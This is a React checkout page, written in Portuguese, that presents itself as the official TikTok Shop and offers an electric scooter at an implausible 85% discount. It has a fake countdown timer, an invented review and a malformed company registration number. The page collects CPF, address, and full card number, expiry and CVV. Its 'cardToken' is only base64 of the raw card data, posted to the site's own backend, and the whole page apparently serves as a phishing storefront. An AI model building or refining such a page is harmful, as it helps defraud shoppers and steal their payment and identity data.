import { useState, useEffect, useCallback } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Gift, Zap, Truck, RotateCcw, Lock, CreditCard } from 'lucide-react';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client'; 

// Assets (Verifique se os caminhos dos seus assets estão corretos)
import tiktokShopIcon from '@/assets/tiktok-shop-icon.webp';
import scooterProduct from '@/assets/scooter-product.webp';

// --- DEFINIÇÃO DE TIPOS E UTILITÁRIOS ---

interface CustomerData {
  name: string;
  email: string;
  phone: string;
  cpf: string;
  cep: string;
  address: string;
  number: string;
  complement: string;
  neighborhood: string;
  city: string;
  state: string;
}

interface CardData {
  number: string;
  holderName: string;
  expiration: string;
  cvv: string;
}

interface ApiError {
  field: keyof (CustomerData & CardData) | 'general' | 'network';
  message: string;
}

// Funções de formatação (melhoradas)
const formatCPF = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  if (cleaned.length <= 11) {
    return cleaned
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  }
  return value;
};

const formatCardNumber = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
  return formatted.substring(0, 19); 
};

const formatExpiration = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  if (cleaned.length >= 2) {
    return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
  }
  return cleaned;
};

const validateEmail = (email: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
const validateCPF = (cpf: string) => cpf.replace(/\D/g, '').length === 11;


// --- COMPONENTE PRINCIPAL ---

const Checkout = () => {
  const { toast } = useToast();
  const [timeLeft, setTimeLeft] = useState(120000); 
  const [selectedPayment, setSelectedPayment] = useState('Pix');
  const [cepLoading, setCepLoading] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  
  // Estados para dados de Identificação e Entrega
  const [customerData, setCustomerData] = useState<CustomerData>({
    name: '',
    email: '',
    phone: '',
    cpf: '',
    cep: '',
    address: '',
    number: '',
    complement: '',
    neighborhood: '',
    city: '',
    state: '',
  });

  // Estado para dados do Cartão
  const [cardData, setCardData] = useState<CardData>({
    number: '',
    holderName: '',
    expiration: '',
    cvv: ''
  });
  
  // Estado para erros (API ou Validação)
  const [apiError, setApiError] = useState<ApiError | null>(null);

  // --- EFEITOS E GESTÃO DE TEMPO ---

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev <= 0 ? 0 : prev - 1000));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (ms: number) => {
    const minutes = Math.floor(ms / 60000);
    const seconds = Math.floor((ms % 60000) / 1000);
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
  };

  // --- HANDLERS DE FORMULÁRIO ---

  const handleCustomerInputChange = (field: keyof CustomerData, value: string) => {
    setApiError(null); // Limpa o erro ao digitar
    let formattedValue = value;

    if (field === 'cpf') {
      formattedValue = formatCPF(value);
    }
    
    setCustomerData(prev => ({ ...prev, [field]: formattedValue }));
  };

  const handleCardInputChange = (field: keyof CardData, value: string) => {
    setApiError(null); // Limpa o erro ao digitar
    let formattedValue = value;
    
    if (field === 'number') {
      formattedValue = formatCardNumber(value);
    } else if (field === 'expiration') {
      formattedValue = formatExpiration(value);
    } else if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').substring(0, 4);
    } else if (field === 'holderName') {
        formattedValue = value.toUpperCase();
    }
    
    setCardData(prev => ({ ...prev, [field]: formattedValue }));
  };

  const fillAddress = useCallback(async (cep: string) => {
    const cleanCep = cep.replace(/\D/g, '');
    if (cleanCep.length !== 8) {
      return;
    }

    setCepLoading(true);
    setApiError(null);
    
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const data = await response.json();
      
      if (data.erro) {
        toast({ title: "CEP não encontrado", description: "Verifique o CEP.", variant: "destructive" });
        setCustomerData(prev => ({ ...prev, address: '', neighborhood: '', city: '', state: '' }));
        return;
      }
      
      setCustomerData(prev => ({ 
        ...prev, 
        address: data.logradouro || '',
        neighborhood: data.bairro || '',
        city: data.localidade || '',
        state: data.uf || '',
      }));
      
      toast({ title: "Endereço encontrado!", description: "Campos preenchidos automaticamente." });
    } catch (error) {
      toast({ title: "Erro ao buscar CEP", description: "Tente novamente.", variant: "destructive" });
    } finally {
      setCepLoading(false);
    }
  }, [toast]);
  
  useEffect(() => {
      // Chama a função fillAddress sempre que o CEP é alterado e tem 8 dígitos
      if (customerData.cep.replace(/\D/g, '').length === 8) {
          fillAddress(customerData.cep);
      }
  }, [customerData.cep, fillAddress]);


  // --- FUNÇÃO DE PAGAMENTO ---

  const processPayment = async () => {
    setIsProcessing(true);
    setApiError(null); 

    const { name, email, phone, cpf, address, number, city, state } = customerData;

    // 1. Validações Front-end

    if (!name || !email || !phone || !cpf || !address || !number || !city || !state) {
      setApiError({ field: 'general', message: "Por favor, preencha todos os campos obrigatórios." });
      toast({ title: "Campos obrigatórios", description: "Preencha todos os dados.", variant: "destructive" });
      setIsProcessing(false);
      return;
    }

    if (!validateEmail(email)) {
      setApiError({ field: 'email', message: "E-mail inválido." });
      toast({ title: "Email inválido", description: "Digite um e-mail válido.", variant: "destructive" });
      setIsProcessing(false);
      return;
    }

    if (!validateCPF(cpf)) {
      setApiError({ field: 'cpf', message: "CPF inválido. Deve ter 11 dígitos." });
      toast({ title: "CPF inválido", description: "Digite um CPF válido.", variant: "destructive" });
      setIsProcessing(false);
      return;
    }

    const cleanedData = { 
      name: name.trim(), 
      email: email.trim(), 
      phone: phone.replace(/\D/g, ''), 
      cpf: cpf.replace(/\D/g, ''),
    };

    const amount = selectedPayment === 'Pix' ? 63.15 : 67.90; 

    // 2. Validação e Processamento do Cartão
    if (selectedPayment === 'Cartao') {
      const { number: cNumber, holderName, expiration, cvv } = cardData;

      if (!cNumber || !holderName || !expiration || !cvv || cNumber.replace(/\s/g, '').length < 15 || expiration.length < 5 || cvv.length < 3) {
        setApiError({ field: 'general', message: "Preencha todos os dados do cartão corretamente." });
        toast({ title: "Dados do cartão incompletos", description: "Preencha os dados do cartão.", variant: "destructive" });
        setIsProcessing(false);
        return;
      }
      
      const cardToken = btoa(JSON.stringify({
        number: cNumber.replace(/\s/g, ''),
        holderName,
        expiration,
        cvv
      }));

      try {
        const { data, error } = await supabase.functions.invoke('process-payment', {
          body: {
            paymentMethod: 'CARD',
            amount,
            cardToken,
            customerData: cleanedData
          }
        });

        if (error) throw error;
        
        if (data && data.error) {
            throw new Error(data.error); 
        }

        if (data.success) {
          toast({ title: "Pagamento aprovado!", description: `Transação: ${data.transactionId}` });
          // Redirecionar para sucesso
        } else {
          throw new Error("Erro desconhecido ao processar Cartão.");
        }
      } catch (error) {
        // Trata erros de rede ou da Edge Function
        handlePaymentError(error);
      }


    } else {
      // 3. Processamento do Pix

      try {
        const { data, error } = await supabase.functions.invoke('process-payment', {
          body: {
            paymentMethod: 'PIX',
            amount,
            customerData: cleanedData
          }
        });

        if (error) throw error;

        if (data && data.error) {
            throw new Error(data.error); 
        }

        if (data.success) {
          toast({ title: "Pix gerado com sucesso!", description: "Use o código para o pagamento." });
          console.log('Pix Data:', data.paymentData);
          // Mostrar QR Code/Pix Copia e Cola
        } else {
          throw new Error("Erro desconhecido ao gerar Pix.");
        }
      } catch (error) {
        // Trata erros de rede ou da Edge Function
        handlePaymentError(error);
      }
    }

    setIsProcessing(false);
  };

  // --- FUNÇÃO DE TRATAMENTO DE ERRO CENTRALIZADA ---
  const handlePaymentError = (error: any) => {
    const errorMessage = error instanceof Error ? error.message : "Erro desconhecido";
    
    // TRATAMENTO CRÍTICO PARA O ERRO DA EDGE FUNCTION
    if (errorMessage.includes('Failed to send a request to the Edge Function') || errorMessage.includes('FetchError')) {
        setApiError({ field: 'network', message: "Erro de rede/servidor. Por favor, verifique sua conexão ou tente novamente mais tarde." });
        toast({ title: "Erro de Conexão", description: "Não foi possível conectar com o servidor de pagamento.", variant: "destructive" });
        return;
    }

    // Trata erros da API, como CPF Inválido
    if (errorMessage.toLowerCase().includes('cpf')) {
        setApiError({ field: 'cpf', message: errorMessage });
    } else {
        setApiError({ field: 'general', message: errorMessage });
    }
    
    toast({ title: "Erro no pagamento", description: errorMessage, variant: "destructive" });
  };
  
  // --- RENDERIZAÇÃO ---

  return (
    <div className="min-h-screen bg-[#f9f9fa]">
      {/* Header e Advice Bar (mantidos do código anterior) */}
      <header className="bg-white border-b">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <img src={tiktokShopIcon} alt="TikTok Shop" className="w-8 h-8" />
              <span className="font-bold text-lg">TikTokShop - Oficial</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-600">
              <Lock className="h-4 w-4" />
              <span>Compra Segura</span>
            </div>
          </div>
        </div>
      </header>

      <div className="bg-[#50b3e8] text-white py-2">
        <div className="container mx-auto px-4 text-center text-sm">
          ✓ Frete grátis em todo Brasil • ✓ Pagamento 100% Seguro • ✓ Garantia de 30 dias
        </div>
      </div>

      <div className="container mx-auto px-4 py-6 max-w-4xl">
        
        {/* Progress, Timer, Product Info, Priority Benefits (mantidos) */}
        {/* ... (código mantido, sem alterações estruturais) ... */}
        
        {/* Progress Steps */}
        <div className="bg-black text-white rounded-lg p-4 mb-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-white text-black rounded-full flex items-center justify-center font-bold">
                1
              </div>
              <span className="text-sm">Carrinho</span>
            </div>
            <div className="flex-1 h-1 bg-gray-700 mx-4"></div>
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-white text-black rounded-full flex items-center justify-center font-bold">
                2
              </div>
              <span className="text-sm">Identificação</span>
            </div>
            <div className="flex-1 h-1 bg-gray-700 mx-4"></div>
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-gray-700 rounded-full flex items-center justify-center font-bold">
                3
              </div>
              <span className="text-sm">Pagamento</span>
            </div>
          </div>
          <div className="text-right text-xs mt-2">
              Você está na etapa 2 (Identificação)
          </div>
        </div>

        {/* Timer */}
        <div className="bg-[#50b3e8] text-[#283368] rounded-lg p-4 mb-6 text-center">
          <div className="flex items-center justify-center gap-2 mb-2">
            <Zap className="h-5 w-5" />
            <span className="font-bold uppercase text-sm">Oferta Relâmpago</span>
            </div>
          <div className="text-3xl font-bold">{formatTime(timeLeft)}</div>
        </div>

        {/* Product Info */}
        <div className="bg-white rounded-lg p-6 mb-6 shadow-sm">
          <div className="flex gap-4">
            <img 
              src={scooterProduct} 
              alt="Patinete Elétrico" 
              className="w-24 h-24 rounded-lg flex-shrink-0 object-cover"
            />
            <div className="flex-1">
              <h3 className="font-bold text-lg mb-2">
                Patinete Elétrico Scooter De Alumínio Com Bluetooth 30km/h
              </h3>
              <div className="flex items-center gap-4 mb-2">
                <span className="text-2xl font-bold text-green-600">R$ 67,90</span>
                <span className="text-sm line-through text-gray-500">R$ 619,90</span>
                <Badge className="bg-[#FE5D38] text-white">Economize até 85%</Badge>
              </div>
              <div className="flex gap-2">
                <Badge className="bg-[#a30080] text-[#ffce47]">
                  Pagamento instantâneo no Pix
                </Badge>
                <Badge className="bg-[#2ecc71] text-white">7% OFF NO PIX</Badge>
              </div>
            </div>
          </div>
        </div>

        {/* Priority Benefits */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
          <div className="bg-white rounded-lg p-4 shadow-sm">
            <div className="flex items-start gap-3">
              <Truck className="h-6 w-6 text-green-600 flex-shrink-0" />
              <div>
                <h4 className="font-bold mb-1">Entrega com Seguro Grátis</h4>
                <p className="text-sm text-gray-600">
                  Nossos produtos são entregues via Correios, assegurando uma entrega segura
                </p>
              </div>
            </div>
          </div>
          <div className="bg-white rounded-lg p-4 shadow-sm">
            <div className="flex items-start gap-3">
              <RotateCcw className="h-6 w-6 text-blue-600 flex-shrink-0" />
              <div>
                <h4 className="font-bold mb-1">Satisfação ou seu Valor de Volta</h4>
                <p className="text-sm text-gray-600">
                  Se o produto entregue chegar com algum defeito ou erro
                </p>
              </div>
            </div>
          </div>
          <div className="bg-white rounded-lg p-4 shadow-sm">
            <div className="flex items-start gap-3">
              <Gift className="h-6 w-6 text-purple-600 flex-shrink-0" />
              <div>
                <h4 className="font-bold mb-1">Pedro Álvares</h4>
                <p className="text-sm text-gray-600">Chegou tudo certinho</p>
                <div className="flex gap-1 mt-1">
                  {[...Array(5)].map((_, i) => (
                    <span key={i} className="text-[#ffd500]">★</span>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>


        {/* Payment Form (Atualizado com estados) */}
        <div className="bg-white rounded-lg p-6 shadow-sm mb-6">
          <h2 className="text-xl font-bold mb-4">Identificação</h2>
          
          <div className="space-y-4 mb-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="name">Nome completo</Label>
                <Input 
                  id="name" 
                  placeholder="Digite seu nome completo" 
                  value={customerData.name}
                  onChange={(e) => handleCustomerInputChange('name', e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="email" className={apiError?.field === 'email' ? 'text-red-500' : ''}>E-mail</Label>
                <Input 
                  id="email" 
                  type="email" 
                  placeholder="seu@email.com" 
                  value={customerData.email}
                  onChange={(e) => handleCustomerInputChange('email', e.target.value)}
                  className={apiError?.field === 'email' ? 'border-red-500 focus:border-red-500' : ''}
                />
                {apiError?.field === 'email' && <p className="text-red-500 text-sm mt-1 font-medium">{apiError.message}</p>}
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="phone">Telefone/WhatsApp</Label>
                <Input 
                  id="phone" 
                  placeholder="(21) 99999-9999" 
                  value={customerData.phone}
                  onChange={(e) => handleCustomerInputChange('phone', e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="cpf" className={apiError?.field === 'cpf' ? 'text-red-500' : ''}>CPF</Label>
                <Input 
                  id="cpf" 
                  placeholder="000.000.000-00"
                  maxLength={14}
                  value={customerData.cpf}
                  onChange={(e) => handleCustomerInputChange('cpf', e.target.value)}
                  className={apiError?.field === 'cpf' ? 'border-red-500 focus:border-red-500' : ''}
                />
                {apiError?.field === 'cpf' && <p className="text-red-500 text-sm mt-1 font-medium">{apiError.message}</p>}
              </div>
            </div>
          </div>

          <Separator className="my-6" />

          <h2 className="text-xl font-bold mb-4">Endereço de Entrega</h2>
          
          <div className="space-y-4 mb-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="cep">CEP</Label>
                <Input 
                  id="cep" 
                  placeholder="00000-000" 
                  maxLength={9}
                  value={customerData.cep}
                  onChange={(e) => handleCustomerInputChange('cep', e.target.value)}
                  disabled={cepLoading}
                />
                {cepLoading && <p className="text-xs text-muted-foreground mt-1">Buscando endereço...</p>}
              </div>
              <div>
                <Label htmlFor="address">Endereço</Label>
                <Input 
                  id="address" 
                  placeholder="Rua" 
                  value={customerData.address}
                  onChange={(e) => handleCustomerInputChange('address', e.target.value)}
                />
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="number">Número</Label>
                <Input 
                  id="number" 
                  placeholder="Número" 
                  value={customerData.number}
                  onChange={(e) => handleCustomerInputChange('number', e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="complement">Complemento</Label>
                <Input 
                  id="complement" 
                  placeholder="Apto, bloco, etc (opcional)" 
                  value={customerData.complement}
                  onChange={(e) => handleCustomerInputChange('complement', e.target.value)}
                />
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <Label htmlFor="neighborhood">Bairro</Label>
                <Input 
                  id="neighborhood" 
                  placeholder="Bairro" 
                  value={customerData.neighborhood}
                  onChange={(e) => handleCustomerInputChange('neighborhood', e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="city">Cidade</Label>
                <Input 
                  id="city" 
                  placeholder="Cidade" 
                  value={customerData.city}
                  onChange={(e) => handleCustomerInputChange('city', e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="state">Estado</Label>
                <Input 
                  id="state" 
                  placeholder="UF" 
                  value={customerData.state}
                  onChange={(e) => handleCustomerInputChange('state', e.target.value)}
                />
              </div>
            </div>
          </div>

          <Separator className="my-6" />

          <h2 className="text-xl font-bold mb-4">Forma de Pagamento</h2>
          
          <RadioGroup value={selectedPayment} onValueChange={setSelectedPayment} className="space-y-3">
            {/* Opção PIX */}
            <div className="flex items-center space-x-2 border rounded-lg p-4 cursor-pointer hover:border-primary">
              <RadioGroupItem value="Pix" id="pix" />
              <Label htmlFor="pix" className="flex-1 cursor-pointer">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="font-semibold">Pix</span>
                    <Badge className="bg-[#2ecc71] text-white">7% OFF</Badge>
                  </div>
                  <span className="text-lg font-bold">R$ 63,15</span>
                </div>
              </Label>
            </div>
            
            {/* Opção Cartão */}
            <div className="border rounded-lg">
              <div className="flex items-center space-x-2 p-4 cursor-pointer hover:border-primary">
                <RadioGroupItem value="Cartao" id="cartao" />
                <Label htmlFor="cartao" className="flex-1 cursor-pointer">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <CreditCard className="h-5 w-5" />
                      <span className="font-semibold">Cartão de Crédito</span>
                      <Badge className="bg-[#a30080] text-[#ffce47]">Aprovação imediata</Badge>
                    </div>
                    <span className="text-lg font-bold">R$ 67,90</span>
                  </div>
                </Label>
              </div>
              
              {selectedPayment === 'Cartao' && (
                <div className="px-4 pb-4 space-y-4 border-t pt-4">
                  <div>
                    <Label htmlFor="card-number">Número do Cartão</Label>
                    <Input
                      id="card-number"
                      placeholder="0000 0000 0000 0000"
                      value={cardData.number}
                      onChange={(e) => handleCardInputChange('number', e.target.value)}
                      maxLength={19}
                    />
                  </div>
                  <div>
                    <Label htmlFor="card-holder">Nome do Titular</Label>
                    <Input
                      id="card-holder"
                      placeholder="Nome como está no cartão"
                      value={cardData.holderName}
                      onChange={(e) => handleCardInputChange('holderName', e.target.value)}
                    />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="card-expiration">Validade</Label>
                      <Input
                        id="card-expiration"
                        placeholder="MM/AA"
                        value={cardData.expiration}
                        onChange={(e) => handleCardInputChange('expiration', e.target.value)}
                        maxLength={5}
                      />
                    </div>
                    <div>
                      <Label htmlFor="card-cvv">CVV</Label>
                      <Input
                        id="card-cvv"
                        placeholder="123"
                        value={cardData.cvv}
                        onChange={(e) => handleCardInputChange('cvv', e.target.value)}
                        maxLength={4}
                        type="password"
                      />
                    </div>
                  </div>
                </div>
              )}
            </div>
          </RadioGroup>
        </div>

        {/* Order Summary (mantido) */}
        <div className="bg-white rounded-lg p-6 shadow-sm mb-6">
          <h2 className="text-xl font-bold mb-4">Resumo do Pedido</h2>
          <div className="space-y-2">
            <div className="flex justify-between">
              <span>Subtotal</span>
              <span>R$ 67,90</span>
            </div>
            <div className="flex justify-between text-green-600">
              <span>Desconto PIX (7%)</span>
              <span>- R$ 4,75</span>
            </div>
            <div className="flex justify-between text-green-600">
              <span>Frete</span>
              <span>Grátis</span>
            </div>
            <Separator className="my-2" />
            <div className="flex justify-between text-xl font-bold">
              <span>Total</span>
              <span className="text-green-600">
                  R$ {selectedPayment === 'Pix' ? '63,15' : '67,90'}
              </span>
            </div>
          </div>
        </div>

        {/* Submit Button */}
        <Button 
          className="w-full h-14 text-lg font-bold uppercase"
          style={{ backgroundColor: '#F72E54' }}
          onClick={processPayment}
          disabled={isProcessing}
        >
          {isProcessing ? 'Processando...' : 'Finalizar Compra'}
        </Button>

        {/* ERROS DE REDE E GERAIS */}
        {(apiError?.field === 'general' || apiError?.field === 'network') && (
            <div className={`mt-4 text-center font-medium p-3 border rounded-lg ${apiError.field === 'network' ? 'text-yellow-700 border-yellow-700 bg-yellow-50' : 'text-red-500 border-red-500 bg-red-50'}`}>
                ⚠️ {apiError.field === 'network' ? 'PROBLEMA DE CONEXÃO' : 'ERRO NO PROCESSAMENTO'}: {apiError.message}
            </div>
        )}

        {/* Security Info (mantido) */}
        <div className="mt-6 text-center text-sm text-gray-600">
          <div className="flex items-center justify-center gap-2 mb-2">
            <Lock className="h-4 w-4" />
            <span>Ambiente 100% Seguro</span>
          </div>
          <p>Seus dados estão protegidos e a compra é totalmente segura</p>
        </div>
      </div>

      {/* Footer (mantido) */}
      <footer className="bg-[#f2f2f2] py-8 mt-12">
        <div className="container mx-auto px-4 text-center text-sm text-[#3a3636]">
          <p className="mb-2">© 2025 TikTokShop - Oficial. Todos os direitos reservados.</p>
          <div className="flex items-center justify-center gap-4">
            <span>CNPJ: 21.999.999/923131</span>
            <span>•</span>
            <span>pedroalvares@gmail.com</span>
            <span>•</span>
            <span>(21) 99999-9999</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Checkout;
